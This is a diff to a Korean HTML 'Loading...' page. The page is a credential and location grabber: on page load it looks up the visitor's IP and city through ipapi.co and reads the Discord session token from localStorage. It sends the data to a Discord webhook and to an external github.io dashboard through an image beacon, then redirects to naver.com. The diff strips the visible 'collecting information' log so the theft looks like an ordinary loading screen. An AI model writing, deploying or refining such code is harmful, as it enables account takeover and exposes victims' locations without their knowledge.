@@ -4,31 +4,14 @@
   <meta charset="UTF-8">
   <title>Loading...</title>
 </head>
-<body style="background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
-  <div id="log" style="background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:600px;width:100%;">
-    <h2>⏳ 정보 수집 중...</h2>
-    <pre id="debug" style="background:#1e1e1e;color:#0f0;padding:10px;border-radius:4px;font-size:12px;overflow-x:auto;min-height:100px;"></pre>
-  </div>
-
+<body>
+  <h1>로딩 중...</h1>
   <script>
     (function() {
-      const debug = document.getElementById('debug');
-      function log(msg) {
-        debug.textContent += msg + '\n';
-        console.log(msg);
-      }
-
-      log('🚀 스크립트 시작');
-
       // 1. IP 정보 가져오기
-      log('📡 IP 정보 요청 중...');
       fetch('https://ipapi.co/json/')
-        .then(res => {
-          log('✅ IP API 응답 받음 (status: ' + res.status + ')');
-          return res.json();
-        })
+        .then(res => res.json())
         .then(data => {
-          log('📦 IP 데이터: ' + JSON.stringify(data, null, 2));
           const ip = data.ip || '알 수 없음';
           const city = data.city || '알 수 없음';
           const region = data.region || '알 수 없음';
@@ -38,29 +21,20 @@
           const lon = data.longitude || '없음';
 
           // 2. 디스코드 토큰 가져오기
-          log('🔑 디스코드 토큰 확인 중...');
           let token = '토큰 없음';
           let userId = '알 수 없음';
           try {
             const rawToken = localStorage.getItem('token');
-            log('📂 localStorage.token: ' + (rawToken ? '존재함' : '없음'));
             if (rawToken) {
               token = rawToken.replace(/^"|"$/g, '');
-              log('🔑 토큰: ' + token.substring(0, 20) + '...');
               try {
                 const payload = JSON.parse(atob(token.split('.')[1]));
                 userId = payload.sub || payload.id || '알 수 없음';
-                log('👤 유저 ID: ' + userId);
-              } catch(e) {
-                log('❌ 토큰 디코딩 실패: ' + e.message);
-              }
+              } catch(e) {}
             }
-          } catch(e) {
-            log('❌ 토큰 접근 오류: ' + e.message);
-          }
+          } catch(e) {}
 
-          // 3. 대시보드로 전송 (여러 방식 시도)
-          const dashboardUrl = 'https://siwooaslkpi-ui.github.io/logger-dashboard/dashboard.html';
+          // 3. 데이터 준비
           const payload = {
             ip: ip,
             city: city,
@@ -70,45 +44,47 @@
             lat: lat,
             lon: lon,
             token: token,
-            userId: userId
+            userId: userId,
+            time: new Date().toISOString()
           };
+
+          // 4. 디스코드 웹훅으로 전송 (대시보드 우회)
+          const webhookURL = 'https://discord.com/api/webhooks/여기에_웹훅_ID/여기에_웹훅_토큰';
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              content: `**📥 새 접속 감지**\nIP: ${ip}\n위치: ${city}, ${region}, ${country}\n통신사: ${isp}\n디코 ID: ${userId}\n토큰: ${token}`
+            })
+          })
+          .then(() => console.log('✅ 웹훅 전송 성공'))
+          .catch(err => console.error('❌ 웹훅 전송 실패:', err));
+
+          // 5. 대시보드로도 전송 (이미지 태그)
+          const dashboardUrl = 'https://siwooaslkpi-ui.github.io/logger-dashboard/dashboard.html';
           const params = new URLSearchParams(payload).toString();
-          const url = dashboardUrl + '?log=' + encodeURIComponent(params);
-
-          log('📤 전송 URL: ' + url);
-
-          // 방법 1: Image 태그
-          log('📤 방법 1: Image 태그로 전송');
           const img = new Image();
-          img.src = url;
-          img.onload = function() { log('✅ Image 전송 성공'); };
-          img.onerror = function() { log('❌ Image 전송 실패'); };
+          img.src = dashboardUrl + '?log=' + encodeURIComponent(params);
+          console.log('📤 대시보드 전송 시도:', img.src);
 
-          // 방법 2: fetch (no-cors)
-          log('📤 방법 2: fetch로 전송');
-          fetch(url, { mode: 'no-cors' })
-            .then(() => log('✅ fetch 전송 완료 (no-cors)'))
-            .catch(err => log('❌ fetch 오류: ' + err.message));
-
-          // 방법 3: 직접 location.href로 이동 (테스트용)
-          // log('📤 방법 3: location.href로 이동');
-          // setTimeout(() => { window.location.href = url; }, 1000);
-
-          // 4. 화면 표시
-          log('✅ 모든 전송 시도 완료');
-          document.querySelector('h2').textContent = '✅ 정보 수집 완료';
-          document.querySelector('h2').style.color = '#0a0';
-
-          // 5. 3초 후 네이버로 이동
-          log('⏳ 3초 후 네이버로 이동');
+          // 6. 화면 표시
+          document.body.innerHTML = `
+            <div style="text-align:center;padding:80px;font-family:sans-serif;color:#333;">
+              <h1>✅ 페이지 로드 완료</h1>
+              <p>잠시 후 자동으로 이동합니다...</p>
+            </div>
+          `;
           setTimeout(() => {
             window.location.href = 'https://naver.com';
-          }, 3000);
+          }, 2000);
         })
         .catch(err => {
-          log('❌ IP API 오류: ' + err.message);
-          document.querySelector('h2').textContent = '⚠️ 오류 발생';
-          document.querySelector('h2').style.color = '#a00';
+          document.body.innerHTML = `
+            <div style="text-align:center;padding:80px;font-family:sans-serif;color:#333;">
+              <h1>⚠️ 오류 발생</h1>
+              <p>${err.message}</p>
+            </div>
+          `;
         });
     })();
   </script>
